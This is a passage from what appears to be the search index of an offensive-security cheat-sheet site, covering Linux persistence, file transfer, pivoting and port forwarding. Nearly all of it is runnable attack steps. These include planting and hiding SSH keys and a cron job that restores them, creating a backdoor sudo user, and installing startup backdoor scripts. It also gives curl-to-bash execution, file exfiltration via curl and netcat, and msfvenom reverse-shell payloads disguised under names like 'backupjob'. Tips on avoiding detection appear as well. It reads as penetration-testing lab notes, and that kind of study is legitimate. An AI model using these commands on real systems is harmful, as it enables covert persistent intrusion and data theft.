&gt;&gt; ~/.ssh/authorized_keys\"</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Establishing-Persistence/SSH-PERSISTENCE/#step-3-ensure-proper-permissions","title":"Step 3. Ensure Proper Permissions","text":"<p>On the target machine, ensure the <code>.ssh</code> directory and <code>authorized_keys</code> file have the correct permissions:</p> <ol> <li>Set the .ssh directory permissions to 700: <code>chmod 700 ~/.ssh</code></li> <li>Set the authorized_keys file permissions to 600: <code>chmod 600 ~/.ssh/authorized_keys</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Establishing-Persistence/SSH-PERSISTENCE/#step-4-configure-ssh-for-key-based-authentication","title":"Step 4. Configure SSH for Key-Based Authentication","text":"<p>Verify the SSH server configuration on the target machine to ensure key-based authentication is enabled. Edit /etc/ssh/sshd_config: <code>sudo nano /etc/ssh/sshd_config</code></p> <ol> <li> <p>Ensure the following lines are present and uncommented: <code>PubkeyAuthentication yes</code> <code>AuthorizedKeysFile .ssh/authorized_keys</code></p> </li> <li> <p>Restart the SSH service to apply the changes: <code>sudo systemctl restart sshd</code></p> </li> <li> <p>Test SSH access using the private key: <code>ssh -i ~/.ssh/persistence_key user@target_machine</code></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Establishing-Persistence/SSH-PERSISTENCE/#step-5-establish-a-backup-ssh-user","title":"Step 5. Establish a Backup SSH User","text":"<p>Create a new user on the target machine as a backup entry point:</p> <ol> <li>Add a new user: <code>sudo adduser backupuser</code></li> <li>Add the new user to the <code>sudo</code> group: <code>sudo usermod -aG sudo backupuser</code></li> <li>Add your public key to the new user <code>authorized_keys</code> file: <code>ssh-copy-id -i ~/.ssh/persistence_key.pub backupuser@target_machine</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Establishing-Persistence/SSH-PERSISTENCE/#step-6-hide-your-presence","title":"Step 6. Hide Your Presence","text":"<p>Move the authorized_keys file to a hidden location and create a symbolic link:</p> <ol> <li> <p>Create a hidden directory: <code>mkdir -p ~/.config/.ssh</code> </p> </li> <li> <p>Move the authorized_keys file: <code>mv ~/.ssh/authorized_keys ~/.config/.ssh/authorized_keys</code> </p> </li> <li> <p>Create a symbolic link: <code>ln -s ~/.config/.ssh/authorized_keys ~/.ssh/authorized_keys</code> </p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Establishing-Persistence/SSH-PERSISTENCE/#step-7-set-up-a-cron-job-for-persistence","title":"Step 7. Set Up a Cron Job for Persistence","text":"<ol> <li>Create a cron job to ensure your SSH key is re-added if removed: <code>(crontab -l ; echo \"@reboot sleep 60 &amp;&amp; cat ~/.config/.ssh/authorized_keys &gt;&gt; ~/.ssh/authorized_keys\") | crontab -</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Establishing-Persistence/Startup-Scripts/","title":"Startup Scripts","text":""},{"location":"Offensive-Security/Linux-Environment/Establishing-Persistence/Startup-Scripts/#step-1-create-the-script","title":"Step 1: Create the Script","text":"<ol> <li> <p>Create the backdoor script with the necessary commands and actions:     <code>nano /path/to/your_script.sh</code></p> </li> <li> <p>Make the script executable. <code>chmod 755 /path/to/your_script.sh</code></p> </li> <li> <p>Add the script to the default runlevels so it runs at startup:     <code>update-rc.d /path/to/your_script.sh defaults</code></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Establishing-Persistence/Startup-Scripts/#step-2-verify-script-permissions-and-path","title":"Step 2: Verify Script Permissions and Path","text":"<ol> <li>Check the script permissions to ensure it is executable by the system:     <code>ls -l /path/to/your_script.sh</code></li> <li>Confirm the script path and the shebang (<code>#!/bin/bash</code>) at the top of the script to specify the interpreter.</li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Establishing-Persistence/Startup-Scripts/#step-3-manual-method-create-a-systemd-service-alternative","title":"Step 3: Manual Method \u2013 Create a systemd Service (Alternative)","text":"<ol> <li> <p>Create a new service file for your script in the systemd directory. <code>nano /etc/systemd/system/your_service_name.service</code></p> </li> <li> <p>Add the following content to the service file:</p> <pre><code>[Unit]\nDescription=Your Script Service\nAfter=network.target\n\n[Service]\nExecStart=/path/to/your_script.sh\nExecReload=/bin/kill -HUP $MAINPID\nExecStop=/bin/kill -SIGINT $MAINPID\nRestart=on-failure\nUser=root\n\n[Install]\nWantedBy=multi-user.target\n</code></pre> </li> <li> <p>Reload the systemd daemon to recognize the new service. <code>systemctl daemon-reload</code></p> </li> <li> <p>Enable the service so it starts on boot. <code>systemctl enable your_service_name.service</code></p> </li> <li> <p>Start the service immediately (optional). <code>systemctl start your_service_name.service</code></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Establishing-Persistence/Startup-Scripts/#step-4-verifying-and-troubleshooting","title":"Step 4: Verifying and Troubleshooting","text":"<ol> <li>Check the status of your service to ensure it\u2019s running correctly:     <code>systemctl status your_service_name.service</code></li> <li>View logs for any issues or errors. <code>journalctl -u your_service_name.service</code></li> <li>Check the runlevel symlinks to ensure your script is correctly linked:     <code>ls -l /etc/rc*.d/*your_script.sh</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/File-Transfer/Download-Operations/","title":"Download Operations","text":""},{"location":"Offensive-Security/Linux-Environment/File-Transfer/Download-Operations/#setting-up-an-http-server-and-downloading-a-file-using-python-2","title":"Setting Up an HTTP Server and Downloading a File Using Python 2","text":"<ol> <li>Start a http server: <code>python -m SimpleHTTPServer 8000</code></li> <li>Download file using python: <code>python2 -c 'import urllib;urllib.urlretrieve (\"http://[IP-ADRESS]:8000/file.txt\", \"file.txt\")'</code></li> <li>Download file using wget: <code>wget http://[IP-ADRESS]:8000/file.txt</code></li> <li>Download file using curl: <code>curl \u2013O https://[IP-ADRESS]:8000/file.txt</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/File-Transfer/Download-Operations/#setting-up-an-http-server-and-downloading-a-file-using-python-3","title":"Setting Up an HTTP Server and Downloading a File Using Python 3","text":"<ol> <li>Start a http server: <code>python3 -m http.server 8000</code></li> <li>Download file using python: <code>python3 -c 'import urllib.request;urllib.request.urlretrieve(\"http://[IP-ADRESS:8000]/file.txt\", \"file.txt\")'</code></li> <li>Download file using wget <code>wget http://[IP-ADRESS]:8000/file.txt</code></li> <li>Download file using curl <code>curl \u2013O https://[IP-ADRESS]:8000/file.txt</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/File-Transfer/Download-Operations/#setting-up-an-apache-server-and-downloading-a-file","title":"Setting Up an Apache Server and Downloading a File","text":"<ol> <li>Put files into the apache web directory: <code>cp nc.exe /var/www/html</code></li> <li>Start the apache server <code>sudo systemctl start apache2</code></li> <li>Download file using wget\u00a0 <code>wget http://[IP-ADRESS]:8000/file.txt</code></li> <li>Download file using curl\u00a0 <code>curl \u2013O https://[IP-ADRESS]:8000/file.txt</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/File-Transfer/Download-Operations/#setting-up-an-http-server-and-downloading-files-using-php","title":"Setting Up an HTTP Server and Downloading Files Using PHP","text":"<ol> <li>Start a http server: \u00a0 <code>php -S 0.0.0.0:8000</code></li> <li>Download a file using file_get_contents and file_put_contents:\u00a0 <code>php -r '$file = file_get_contents(\"http://[IP-ADRESS]:8000/file.txt\"); file_put_contents(\"file.txt\",$file);'</code></li> <li>Download a file using fopen:\u00a0 <code>php -r 'const BUFFER = 1024; $fremote = fopen(\"http://[IP-ADRESS]:8000/file.txt\", \"rb\"); $flocal = fopen(\"file.txt\", \"wb\"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'</code></li> <li>Download and pipe to bash: \u00a0 <code>php -r '$lines = @file(\"http://[IP-ADRESS]:8000/file.txt\"); foreach ($lines as $line_num =&gt; $line) { echo $line; }' | bash</code></li> <li> <p>Download file using wget :</p> <p><code>wget http://[IP-ADRESS]:8000/file.txt</code> 6.  Download file using curl : <code>curl \u2013O https://[IP-ADRESS]:8000/file.txt</code></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/File-Transfer/Download-Operations/#setting-up-an-http-server-and-downloading-files-using-ruby","title":"Setting Up an HTTP Server and Downloading Files Using Ruby","text":"<ol> <li>Start an HTTP server: <code>ruby -run -e httpd . -p 8000</code></li> <li>Download file using Ruby: <code>ruby -e 'require \"net/http\"; File.write(\"file.txt\", Net::HTTP.get(URI.parse(\"http://[IP-ADDRESS]:8000\")))'</code></li> <li>Download file using wget: <code>wget http://[IP-ADDRESS]:8000/file.txt</code></li> <li>Download file using curl: <code>curl -O https://[IP-ADDRESS]:8000/file.txt</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/File-Transfer/Download-Operations/#fileless-downloads","title":"Fileless Downloads","text":"<ol> <li>Curl to bash: Download and execute script without saving. <code>curl http://[IP-ADDRESS]:8000/script.sh | bash</code></li> <li>Wget to Python: Download Python script and execute without saving. <code>wget -qO- http://[IP-ADDRESS]:8000/script.py | python3</code></li> <li>Download file using Perl: <code>perl -e 'use LWP::Simple; getstore(\"http://[IP-ADDRESS]:8000/file.txt\", \"file.txt\");'</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/File-Transfer/Download-Operations/#bash-devtcp-downloads","title":"Bash (/dev/tcp) Downloads","text":"<ol> <li>Connect to the target webserver: <code>exec 3&lt;&gt;/dev/tcp/[IP-ADDRESS]/80</code></li> <li>Send HTTP GET request: <code>echo -e \"GET /LinEnum.sh HTTP/1.1\\n\\n\"&gt;&amp;3</code></li> <li>Print the response: <code>cat &lt;&amp;3</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/File-Transfer/Download-Operations/#base64-encoding-and-decoding","title":"Base64 Encoding and Decoding","text":"<ol> <li>Encode file to Base64: <code>cat file | base64 -w 0; echo</code></li> <li>Decode Base64 to file: <code>echo -n 'BASE64-STRING' | base64 -d &gt; output_file</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/File-Transfer/Download-Operations/#ssh-and-scp-operations","title":"SSH and SCP Operations","text":"<ol> <li><code>scp -P 6498 linpeas.sh [USERNAME]@[IP-ADRESS]:/tmp</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/File-Transfer/Upload-Operations/","title":"Upload Operations","text":""},{"location":"Offensive-Security/Linux-Environment/File-Transfer/Upload-Operations/#file-uploading-using-python-and-curl","title":"File Uploading Using Python and Curl","text":"<ol> <li>Install uploadserver: <code>sudo python3 -m pip install --user uploadserver</code></li> <li>Generate a self-signed certificate: <code>openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'</code></li> <li>Create a directory for the HTTPS server: <code>mkdir https &amp;&amp; cd https</code></li> <li>Start the upload server with HTTPS support: <code>sudo python3 -m uploadserver 443 --server-certificate ~/server.pem</code></li> <li>Upload files using curl: <code>curl -X POST https://hostname/upload -F 'files=@/path/to/file' --insecure</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/File-Transfer/Upload-Operations/#file-uploader-on-apache-web-server","title":"File Uploader on Apache Web Server","text":"<ol> <li> <p>Create <code>upload.php</code> in <code>/var/www/html/</code>:</p> <pre><code>&lt;?php\n$uploaddir = '/var/www/uploads/';\n$uploadfile = $uploaddir . $_FILES['file']['name'];\nmove_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)\n?&gt;\n</code></pre> </li> <li> <p>Create uploads directory and set ownership to www-data: <code>mkdir /var/www/uploads &amp;&amp; chown www-data:www-data /var/www/uploads</code></p> </li> <li> <p>Upload a file using wget to the Python HTTP server: <code>wget --post-file=/path/to/file http://[IP-ADRESS]/</code></p> </li> <li> <p>Upload a file using wget to the Apache server with upload.php: <code>wget --post-file=/path/to/file http://[IP-ADRESS]/upload.php</code></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/File-Transfer/Upload-Operations/#file-uploader-using-simplehttpserverwithupload","title":"File Uploader Using SimpleHTTPServerWithUpload","text":"<ol> <li>Start an HTTP server to accept file uploads using the script from SimpleHTTPServerWithUpload: <code>python3 SimpleHTTPServerWithUpload.py 80</code></li> <li>Upload passwd file using curl: <code>curl -F 'file=@/dev/shm/passwd' http://[IP-ADRESS]/</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/File-Transfer/Upload-Operations/#file-uploading-using-python-requests-module","title":"File Uploading Using Python Requests Module","text":"<ol> <li>Install the uploadserver package: <code>pip3 install uploadserver</code></li> <li>Start a Python upload server: <code>python3 -m uploadserver</code></li> <li>Upload a file: <code>python3 -c 'import requests;requests.post(\"http://[IP-ADDRESS]:8000/upload\",files={\"files\":open(\"/path/to/file\",\"rb\")})'</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/File-Transfer/Upload-Operations/#file-uploading-using-netcat","title":"File Uploading Using Netcat","text":"<ol> <li>Start a netcat listener to receive file and save it as file.txt: <code>nc -nvlp 9001 &gt; file.txt</code></li> <li>Send the file.txt to the receiving machine: <code>nc [IP-ADDRESS] 9001 &lt; file.txt</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/File-Transfer/Upload-Operations/#file-uploading-using-scp","title":"File Uploading Using SCP","text":"<ol> <li>TRANSFERRING FILES WITH A SPECIFIC SSH KEY:     To use a specific SSH key for authentication, include the <code>-i</code> option. This is useful when dealing with multiple SSH keys or when the default key is not suitable for the connection. <code>scp -i /path/to/private_key [FILE-TO-SEND] [USER]@[RECEIVER-IP]:/path/to/destination</code></li> <li>USING NON-STANDARD PORTS:     SSH servers often use non-standard ports for security purposes. Specify the port with the <code>-P</code> option to ensure successful connections. <code>scp -P 2222 [FILE-TO-SEND] [USER]@[RECEIVER-IP]:/path/to/destination</code></li> <li>VERBOSE MODE FOR DEBUGGING:     Verbose mode provides detailed information about the SCP transfer process, which is invaluable for debugging connection issues. <code>scp -v [FILE-TO-SEND] [USER]@[RECEIVER-IP]:/path/to/destination</code></li> <li>LIMITING BANDWIDTH USAGE:     To avoid detection or to manage network resources efficiently, you can limit the bandwidth usage during file transfer using the <code>-l</code> option (specified in kilobits per second): <code>scp -l 1000 [FILE-TO-SEND] [USER]@[RECEIVER-IP]:/path/to/destination</code></li> <li>TRANSFERRING ENTIRE DIRECTORIES:     When you need to transfer entire directories, use the <code>-r</code> option to copy recursively. This ensures all files and subdirectories are included. <code>scp -r [DIRECTORY-TO-SEND] [USER]@[RECEIVER-IP]:/path/to/destination</code></li> <li>PRESERVING FILE ATTRIBUTES:     To preserve file attributes such as modification times, access times, and modes, use the <code>-p</code> option: <code>scp -p [FILE-TO-SEND] [USER]@[RECEIVER-IP]:/path/to/destination</code></li> <li>QUIET MODE:     To minimize output and avoid drawing attention, use the <code>-q</code> option for quiet mode. This suppresses non-error messages. <code>scp -q [FILE-TO-SEND] [USER]@[RECEIVER-IP]:/path/to/destination</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Pivoting-Tunneling-and-Port-Forwarding/Pivoting/Chisel/","title":"Chisel","text":"<ol> <li> <p>Run <code>ifconfig</code> and look for extra interfaces, in this example, we find <code>ens224</code>, which connects to a network our current machine can't reach directly.</p> <p></p> </li> <li> <p>If Chisel has not yet been installed, clone the repository using the following command:  <code>git clone https://github.com/jpillora/chisel.git</code> </p> <p></p> </li> <li> <p>Navigate to the Chisel directory and build the binary using the command below: <code>cd chisel &amp;&amp; go build</code> </p> <p></p> </li> <li> <p>Alternatively, if you prefer not to build the binary yourself, you can download a pre-built version. After downloading, unzip the file using: <code>gzip -d chisel_1.10.0_linux_amd64.gz</code> </p> <p></p> </li> <li> <p>Transfer the Chisel binary to the target machine (Refer to the File Transfer section for more details). Then, execute the Chisel server with: <code>chmod +x chisel &amp;&amp; ./chisel server -v -p 1234 --socks5</code> </p> <p> </p> NOTE <p>The Chisel server will listen for incoming connections on port 1234, utilizing SOCKS5 (--socks5), and forward traffic to all networks accessible from the pivot host. In our scenario, the pivot host has an interface on the 172.16.5.0/23 network, enabling us to reach hosts within this network.</p> </li> <li> <p>On the attack host, start the Chisel client and connect to the Chisel server using: <code>./chisel client -v 10.129.236.111:1234 socks</code> </p> <p></p> </li> <li> <p>Modify the proxychains.conf file to include the following configuration: <code>socks5 127.0.0.1 1080</code> </p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Pivoting-Tunneling-and-Port-Forwarding/Pivoting/ICMP-Tunneling-with-ptunnel-ng/","title":"ICMP Tunneling with ptunnel-ng","text":""},{"location":"Offensive-Security/Linux-Environment/Pivoting-Tunneling-and-Port-Forwarding/Pivoting/ICMP-Tunneling-with-ptunnel-ng/#introduction","title":"Introduction","text":"<p>ICMP tunneling enables traffic to be encapsulated within ICMP echo requests and responses, allowing data to bypass firewalls that permit ping traffic. This technique is particularly effective for data exfiltration and establishing tunnels to external servers.</p> <ol> <li> <p>If ptunnel-ng is not already installed, clone the repository to your attack host using the following command: <code>git clone https://github.com/utoni/ptunnel-ng.git</code> </p> <p></p> </li> <li> <p>After cloning the ptunnel-ng repository, navigate to the directory and run the <code>autogen.sh</code> script. Install the necessary dependencies using: <code>cd ptunnel-ng &amp;&amp; sudo apt install build-essential autoconf automake &amp;&amp; sudo ./autogen.sh</code> </p> <p></p> </li> <li> <p>Once ptunnel-ng is set up on the attacker machine, transfer the repository to the target host (Refer to the File Transfer section for more details).  </p> <p></p> </li> <li> <p>On the target host, start the ptunnel-ng server with the following command: <code>sudo ./ptunnel-ng -r10.10.15.130 -R22</code> </p> <p></p> </li> <li> <p>On the attack machine, connect to the ptunnel-ng server using: <code>sudo ./ptunnel-ng -p10.10.15.130 -l2222 -r10.10.15.130 -R22</code> </p> <p></p> </li> <li> <p>Tunnel an SSH connection through the ICMP tunnel by running: <code>ssh -p22 -lubuntu 127.0.0.1</code></p> </li> <li> <p>To perform a full Nmap scan through the ICMP tunnel using ProxyChains. <code>proxychains nmap -sV -sT 172.16.4.3 -p-</code></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Pivoting-Tunneling-and-Port-Forwarding/Pivoting/Ligolo-ng/","title":"Ligolo-ng","text":"<ol> <li> <p>Run <code>ifconfig</code> and look for extra interfaces, in this example, we find <code>ens224</code>, which connects to a network our current machine can't reach directly.  </p> <p></p> </li> <li> <p>To ensure that the <code>ens224</code> network is accessible from our attack host, we need to set up Ligolo-ng. If it's not already installed, clone the repository with the following command:     <code>git clone https://github.com/nicocha30/ligolo-ng.git</code> </p> <p></p> </li> <li> <p>Navigate to the ligolo-ng directory and compile the binary agent and proxy using the command:  <code>cd ligolo-ng &amp;&amp; go build -o agent cmd/agent/main.go &amp;&amp; go build -o proxy cmd/proxy/main.go</code> </p> <p></p> </li> <li> <p>Alternatively, if you prefer not to build the binary yourself, you can download a pre-built version.  </p> <p></p> </li> <li> <p>Create a new TUN interface with the following commands:     <code>ip tuntap add user root mode tun ligolo &amp;&amp; ip link set ligolo up</code> </p> <p></p> </li> <li> <p>There are several methods to transfer the agent from your attacker machine to the target. Refer to the File Transfer section for more details.</p> <p></p> </li> <li> <p>On your attacker machine, from the directory where the proxy file was built, run:     <code>./proxy -selfcert</code> OR <code>./proxy -autocert</code> </p> <p></p> </li> <li> <p>Use the agent to establish a connection back to your attacker machine with the following command: <code>./agent -connect IP:11601 -ignore-cert</code></p> <p></p> </li> <li> <p>From the Ligolo-ng terminal window, run <code>session</code>, followed by <code>start</code>to initiate the session.</p> <p></p> </li> <li> <p>To route traffic through the Ligolo-ng tunnel, add a new route with the following command:     <code>ip route add 172.16.4.0/23 dev ligolo &amp;&amp; ip route</code> </p> <p></p> </li> <li> <p>Finally, confirm that pivoting is working by successfully pinging a machine on the second network.</p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Pivoting-Tunneling-and-Port-Forwarding/Pivoting/Metasploit/","title":"Metasploit","text":"<ol> <li> <p>By using the <code>ifconfig</code> command, we observe that there is another network interface, ens192, which is part of a network that our current machine does not have direct access to.  </p> <p></p> </li> <li> <p>To gain access to the <code>ens192</code> network, we can set up pivoting using Metasploit. The first step is to generate a reverse shell in ELF format using msfvenom. <code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.219 LPORT=1337 -f elf &gt; hackfast.elf</code> </p> <p></p> </li> <li> <p>Transfer the generated ELF file to the target machine (Check the File Transfer section for more information).  </p> <p></p> </li> <li> <p>Start a Metasploit multi/handler to receive the reverse shell. <code>msfconsole -x \"use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set lhost 10.10.14.219; set lport 1337; exploit\"</code> </p> <p></p> </li> <li> <p>After transferring the ELF file, give it execution permissions and run it on the target machine. <code>chmod +x hackfast.elf &amp;&amp; ./hackfast.elf</code> </p> <p></p> </li> <li> <p>With a Meterpreter shell established, we can now set up a SOCKS proxy server through Metasploit to tunnel our traffic. Use the following commands:</p> <pre><code>use auxiliary/server/socks_proxy\nset SRVPORT 9050\nset SRVHOST 0.0.0.0\nset version 4a\nrun\njobs    //Confirming Proxy Server is Running\n</code></pre> <p></p> </li> <li> <p>After starting the SOCKS server, configure ProxyChains to route traffic through our newly established pivot. Add the following line to the end of the proxychains.conf file, typically located at /etc/proxychains.conf: <code>socks4 127.0.0.1 9050</code> </p> <p></p> </li> <li> <p>Finally, use the post/multi/manage/autoroute module in Metasploit to route traffic for the 172.16.5.0 subnet through the Meterpreter session. This allows tools like Nmap to scan the target network through the proxy.</p> <pre><code>use post/multi/manage/autoroute\nset SESSION 1\nset subnet 172.16.8.0\nrun\n</code></pre> <p></p> </li> <li> <p>To discover active hosts within the 172.16.8.0/23 subnet, we can use the ping_sweep module:</p> <pre><code>use post/multi/gather/ping_sweep\nset rhosts 172.16.8.0/23\nset SESSION 1\nrun\n</code></pre> <p></p> </li> <li> <p>With everything set up, you can now use Nmap (or other tools) to scan through the pivoting: <code>proxychains nmap -sT -p22 [IP-ADRESS]</code> </p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Pivoting-Tunneling-and-Port-Forwarding/Pivoting/SSH/","title":"SSH","text":"<ol> <li> <p>By using the <code>ifconfig</code> command, we observe that there is another network interface <code>ens192</code>, which is part of a network that our current machine does not have direct access to.  </p> <p></p> </li> <li> <p>To discover Active hosts within the 172.16.8.0/23 subnet, we can use the following command:  <code>for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 &amp; done | grep from</code> </p> <p></p> </li> <li> <p>We can use the following command to establish an SSH pivot using dynamic port forwarding   <code>ssh -D 8081 -i id_rsa root@10.129.x.x</code></p> <p> </p> NOTE <p>When using a password, you\u2019ll need to enter it after executing the command without the <code>-i id_rsa</code> option.</p> </li> <li> <p>Next, we need to modify the /etc/proxychains.conf to use the port we specified with our dynamic port forwarding command (8081 here). <pre><code>netstat -antp | grep 8081\ngrep socks4 /etc/proxychains.conf\n</code></pre> </p> </li> <li> <p>With everything set up, we can now use Nmap (or other tools) to scan through the pivoting:  </p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Pivoting-Tunneling-and-Port-Forwarding/Port-Forwarding/Enumeration/","title":"Enumeration","text":""},{"location":"Offensive-Security/Linux-Environment/Pivoting-Tunneling-and-Port-Forwarding/Port-Forwarding/Enumeration/#introduction","title":"Introduction","text":"<p>Before we start, we need to understand exactly what we are looking for:</p> <ol> <li> <p>Local Address 0.0.0.0: The service is listening on all interfaces and will be visible locally, internally, and externally.     If we find a service listening on 0.0.0.0 that was not visible externally during our Nmap scan, it means the firewall is blocking inbound connections to this port. This is a port forwarding opportunity!  </p> </li> <li> <p>Local Address 127.0.0.1: The service is only listening for connections locally from this host (localhost), not from anywhere else. This is a port forwarding opportunity!  </p> </li> <li> <p>Local Address 172.16.1.150: The service is only listening for connections from the local network (internally).Only hosts on the local network can connect to this service. This is a port forwarding opportunity!  </p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Pivoting-Tunneling-and-Port-Forwarding/Port-Forwarding/Enumeration/#enumerating-open-ports-manual-method","title":"Enumerating Open Ports \u2013 Manual Method","text":"<ol> <li>To enumerate open ports on a Linux host, we can use the following command:  </li> </ol> <pre><code>netstat -tulpn\n</code></pre> Tips &amp; Tricks <p>To investigate an internal port, use:  </p> <pre><code>ps -ef | grep 3360\n</code></pre> <p>This will display the process details.  </p>"},{"location":"Offensive-Security/Linux-Environment/Pivoting-Tunneling-and-Port-Forwarding/Port-Forwarding/Enumeration/#enumerating-open-ports-automated-method-linpeas","title":"Enumerating Open Ports \u2013 Automated Method (LinPEAS)","text":"<ol> <li>If you don\u2019t already have LinPEAS, download it with the following command:  </li> </ol> <pre><code>wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh\n</code></pre> <ol> <li>Host the LinPEAS script using Python:  </li> </ol> <pre><code>python3 -m http.server 8000\n</code></pre> <ol> <li>Transfer the script to the target machine using <code>wget</code>:  </li> </ol> <pre><code>wget http://[IP-ADDRESS]:8000/linpeas.sh\n</code></pre> <ol> <li>On the target machine, download and execute LinPEAS:  </li> </ol> <pre><code>chmod `x linpeas.sh &amp;&amp; ./linpeas.sh\n</code></pre> NOTE <p>Scrolling down to the Network Information &gt; Active Ports, we can see that it\u2019s the same as the output from netstat, which is actually what LinPEAS uses to pull this info for us. </p>"},{"location":"Offensive-Security/Linux-Environment/Pivoting-Tunneling-and-Port-Forwarding/Port-Forwarding/Meterpreter-Tunneling-%26-Port-Forwarding/","title":"Meterpreter Tunneling & Port Forwarding","text":""},{"location":"Offensive-Security/Linux-Environment/Pivoting-Tunneling-and-Port-Forwarding/Port-Forwarding/Meterpreter-Tunneling-%26-Port-Forwarding/#meterpreter-tunneling-port-forwarding","title":"Meterpreter Tunneling &amp; Port Forwarding","text":"<p>This section covers the essential commands and steps for setting up Meterpreter port forwarding. It assumes you already have a Meterpreter shell on an Ubuntu server (pivot host) and want to perform enumeration scans through this host.  </p>"},{"location":"Offensive-Security/Linux-Environment/Pivoting-Tunneling-and-Port-Forwarding/Port-Forwarding/Meterpreter-Tunneling-%26-Port-Forwarding/#creating-payload-for-ubuntu-pivot-host","title":"Creating Payload for Ubuntu Pivot Host","text":"<ol> <li> <p>Generate payload: <pre><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 LPORT=8080 -f elf -o backupjob\n</code></pre></p> </li> <li> <p>Start multi/handler: <pre><code>msf6 &gt; use exploit/multi/handler\nmsf6 exploit(multi/handler) &gt; set LHOST 0.0.0.0\nmsf6 exploit(multi/handler) &gt; set LPORT 8080\nmsf6 exploit(multi/handler) &gt; set PAYLOAD linux/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) &gt; run\n</code></pre></p> </li> <li> <p>Copy and execute payload on pivot host: <pre><code>chmod `x backupjob &amp;&amp; ./backupjob\n</code></pre></p> </li> <li> <p>Verify Meterpreter session: <pre><code>meterpreter &gt; pwd\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Pivoting-Tunneling-and-Port-Forwarding/Port-Forwarding/Meterpreter-Tunneling-%26-Port-Forwarding/#configuring-msf-socks-proxy","title":"Configuring MSF SOCKS Proxy","text":"<ol> <li> <p>Start SOCKS proxy: <pre><code>msf6 &gt; use auxiliary/server/socks_proxy\nmsf6 auxiliary(server/socks_proxy) &gt; set SRVPORT 9050\nmsf6 auxiliary(server/socks_proxy) &gt; set SRVHOST 0.0.0.0\nmsf6 auxiliary(server/socks_proxy) &gt; set VERSION 4a\nmsf6 auxiliary(server/socks_proxy) &gt; run\n</code></pre></p> </li> <li> <p>Add entry to proxychains.conf: <pre><code>socks4 127.0.0.1 9050\n</code></pre></p> </li> <li> <p>Create routes with AutoRoute: <pre><code>msf6 &gt; use post/multi/manage/autoroute\nmsf6 post(multi/manage/autoroute) &gt; set SESSION 1\nmsf6 post(multi/manage/autoroute) &gt; set SUBNET 172.16.5.0\nmsf6 post(multi/manage/autoroute) &gt; run\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Pivoting-Tunneling-and-Port-Forwarding/Port-Forwarding/Meterpreter-Tunneling-%26-Port-Forwarding/#testing-proxy-routing-functionality","title":"Testing Proxy &amp; Routing Functionality","text":"<ol> <li> <p>Run an Nmap scan: <pre><code>proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn\n</code></pre></p> </li> <li> <p>Set up local port forwarding: <pre><code>meterpreter &gt; portfwd add -l 3300 -p 3389 -r 172.16.5.19\n</code></pre></p> </li> <li> <p>Connect to the target: <pre><code>xfreerdp /v:localhost:3300 /u:victor /p:pass@123\n</code></pre></p> </li> <li> <p>View active connections with netstat: <pre><code>netstat -antp\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Pivoting-Tunneling-and-Port-Forwarding/Port-Forwarding/Meterpreter-Tunneling-%26-Port-Forwarding/#reverse-port-forwarding","title":"Reverse Port Forwarding","text":"<ol> <li> <p>Add a reverse port forward: <pre><code>meterpreter &gt; portfwd add -R -l 8081 -p 1234 -L 10.10.14.18\n</code></pre></p> </li> <li> <p>Start multi/handler: <pre><code>msf6 exploit(multi/handler) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) &gt; set LPORT 8081\nmsf6 exploit(multi/handler) &gt; set LHOST 0.0.0.0\nmsf6 exploit(multi/handler) &gt; run\n</code></pre></p> </li> <li> <p>Generate Windows payload: <pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 LPORT=1234 -f exe -o backupscript.exe\n</code></pre></p> </li> <li> <p>Establish a Meterpreter session: <pre><code>meterpreter &gt; shell\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Pivoting-Tunneling-and-Port-Forwarding/Port-Forwarding/SSH-Port-Forwarding/","title":"SSH Port 